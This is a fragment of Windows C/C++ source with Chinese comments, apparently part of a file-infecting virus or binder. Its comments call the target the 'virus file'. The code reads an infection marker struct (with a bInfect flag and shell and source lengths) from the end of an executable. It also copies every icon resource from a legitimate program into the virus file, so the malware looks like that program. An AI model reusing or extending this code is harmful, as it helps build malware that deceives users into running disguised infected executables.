struct MODIFY_DATA {
	unsigned int iMyLength; // 常量(定位自身)
	unsigned int iShellLength;      //文件长度(自身)
	unsigned int iSourcLength;
	BOOL bInfect;
} modify_data; //这个是jiaozhu的测试文件xxx.exe的大小，你还还原成0x123456578

void  ReadExeFlag(char *strExeName, MODIFY_DATA *mody_data)
{
	struct _stat ST; 
	_stat(strExeName, &ST);
	
	
	FILE* rwFile;
	if((rwFile=fopen(strExeName,"rb+"))==NULL) 
	{ 
		return; 
	}
	fseek(rwFile,ST.st_size-16,0);//SEEK_SET 从文件的开始处开始搜索 
	fread(mody_data,16,1,rwFile);
	fclose(rwFile);
}
/**************************************************************
* 函数：SetRes
* 参数：LPSTR szImageName --要资源更新的程序名字
LPSTR szResType -- 更新的资源类型   
LPSTR szResName -- 更新的资源名称
LPVOID pData -- 可执行文件的资源数据的指针
DWORD cbData -- 指定lpData中的资源数据数据大小 
* 功能：该函数用来更新exe中的资源
**************************************************************/
int SetRes(LPSTR szImageName, //virus file
		   LPSTR szResType,//icon
		   LPSTR szResName,
		   LPVOID pData,//source file res
		   DWORD cbData)
{
	HANDLE hExe = BeginUpdateResource(szImageName,0);
	if(hExe==NULL) throw("BeginUpdateResource");
	int res = UpdateResource(
		hExe,
		szResType,
		szResName,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
		pData,//source file
		cbData);
	if (!res) throw("UpdateResource");
	if (!EndUpdateResource(hExe, 0)) throw("EndUpdateResource");
	return 1;
}
 
/**************************************************************
* 函数：EnumIconProc
* 参数：HMODULE hModule --module 句柄
LPCTSTR lpszType --资源类型
LPTSTR lpszName --资源名称
LONG   lParam --请求定义好的参数 
* 功能：该函数枚举源Exe中的所有图标，设置到另一个exe中去
**************************************************************/
BOOL CALLBACK EnumIconProc(HMODULE hModule,//source file
						   LPCTSTR lpszType,
						   LPTSTR lpszName,//automatic
						   LONG lParam)//virus file
{
	HRSRC hRes = FindResource(hModule, lpszName, RT_ICON);
	if (hRes == NULL) throw("Could not locate icon resource.");
	// Load the icon into global memory. 
	HGLOBAL hResLoad = LoadResource(hModule, hRes);
	if (hResLoad == NULL) throw("Could not load icon."); 
	// Lock the dialog box into global memory. 
	LPVOID pData = LockResource(hResLoad);
	if (pData == NULL) throw("Could not lock Icon."); 
	DWORD cbData = SizeofResource(hModule, hRes);
	if (lParam)
	{
		SetRes((LPSTR)lParam,
			RT_ICON,
			lpszName,
			pData,
			cbData
			);
	}
	return TRUE;
} 

/**************************************************************
* 函数：SetExeIcon
* 参数：LPSTR szLoadFrom--图标提取文件
LPSTR szSetTo --待更新图标文件
* 功能：该函数把一个Exe中的图标转入到另一个exe中去
**************************************************************/
int SetExeIcon(LPSTR szLoadFrom, LPSTR szSetTo)
{
	HMODULE hExe = LoadLibrary(szLoadFrom);//把EXE当二进制资源加载 source file
	if (hExe == NULL) throw("Could not load icon exe."); 
	EnumResourceNames(
		hExe,   
		RT_ICON,     
		(ENUMRESNAMEPROC) EnumIconProc, 
		(LONG)szSetTo    //virus file
		);
	FreeLibrary(hExe);
	return 1;
}
 